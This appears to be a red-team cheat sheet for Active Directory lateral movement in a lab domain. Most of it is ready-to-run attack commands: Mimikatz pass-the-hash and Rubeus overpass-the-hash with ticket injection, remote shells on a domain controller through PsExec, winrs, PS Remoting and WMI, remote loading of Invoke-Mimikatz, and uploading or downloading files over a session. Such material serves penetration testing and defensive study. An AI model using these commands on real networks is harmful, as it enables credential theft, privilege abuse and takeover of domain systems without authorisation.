
## Requirement

1 - First we need to run a command prompt with privileged user hash. So we need `Mimikatz` or `Rubeus`:

Use `PtH` technique on windows 10:

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:5b4c6335673a75f13ed948e848f00840 /run:cmd.exe"
```

Use `Over Pass The Hash (PTK)` technique on windows 11 and inject the stolen TGT into our own session:

```cmd
Rubeus.exe asktgt /domain:lab.local /user:spn /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
```

Or when we have TGT but we want inject it:

```cmd
Rubeus.exe asktgt /domain:lab.local /user:spn /rc4:8846f7eaee8fb117ad06bdd830b7586c /outfile:ticket.kirbi

Rubeus.exe ptt /ticket:ticket.kirbi

Rubeus.exe renew /ticket:ticket.kirbi
```

verify TGT with List all current tickets:

```cmd
Rubeus.exe klist
Rubeus.exe triage
```

## Perform Lateral Movement

2- Accessing resources using the session (CMD) in which the TGT was exported:

```cmd
pushd \\dc1\c$

dir \\dc1\c$

PsExec.exe -accepteula \\dc1.lab.local cmd

# With current session:
winrs -r:dc1.lab.local "cmd /c hostname"

# With Credential
winrs -r:dc1.lab.local -u:'spn' -p:'password' "cmd /c hostname"

$session = New-PSSession -ComputerName DC1 -Credential
Enter-PSSession -Session $session
```


## WinRM

We can use Winrm protocol in different ways:

1. PS Remoting
2. winrs
3. Com Object


Key difference: PS Remoting is for PowerShell-heavy tasks like interactive shells, copy file .WinRS is for basic command execution and non interactive shells.


PS Remote is a PowerShell script that allows an attacker to remotely execute PowerShell commands on a target system.

Test WinRm is enabled or not:

```powershell
Test-NetConnection -Port 5985 -ComputerName DESKTOP-S95DUHA

Test-NetConnection -Port 5985 -ComputerName DC1
```

Method 1. Using inline credential:

```powershell
$secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential ("lab.local\spn", $secpasswd)

$session = New-PSSession -ComputerName DC1 -Credential $cred

Get-PSSession

Enter-PSSession 1 # OR -> Enter-PSSession -Session $session

calc.exe
```

Method 1. Presenting credential through a graphical environment:

```powershell
$session = New-PSSession -ComputerName DC1 -Credential

Get-PSSession

Enter-PSSession 1 # OR -> Enter-PSSession -Session $session

calc.exe
```

‍`Invoke-Command` is a cmdlet in PowerShell used with PS Remoting to execute PowerShell commands or scripts remotely on one or more computers. It relies on the WS-Management protocol (WinRM).

```powershell
# Format:
Invoke-Command -ComputerName <ComputerName> -ScriptBlock {<Command or Script>}

Invoke-Command -Computername DC1.local -FilePath 'C:\Tools\Invoke-Mimikatz.ps1'

# Method 1: Run commands on remote computer with credentials
$secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("lab.local\spn", $secpasswd)
Invoke-Command -ComputerName DC1 -ScriptBlock { whoami; hostname } -Credential $cred

# Method 2: Run commands using an existing PSSession
$session = New-PSSession -ComputerName DC1 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { whoami; hostname }
# Cleanup: Remove session
Remove-PSSession $session

# Upload file to remote session
Copy-Item -Path C:\Temp\PowerView.ps1 -Destination C:\Temp\ -ToSession (Get-PSSession)

# Download file from remote session
Copy-Item -Path C:\Users\Administrator\Desktop\test.txt -Destination C:\Temp\ -FromSession (Get-PSSession)

# Load script into remote session
Invoke-Command -FilePath 'C:\Tools\Invoke-Mimikatz.ps1' -Session $Session
```

```
# Check what hosts are trusted
Get-Item WSMan:\localhost\Client\TrustedHosts
```

## WMI

```powershell
wmic /node:192.168.8.143 /user:spn process call create "cmd.exe /c calc"
```
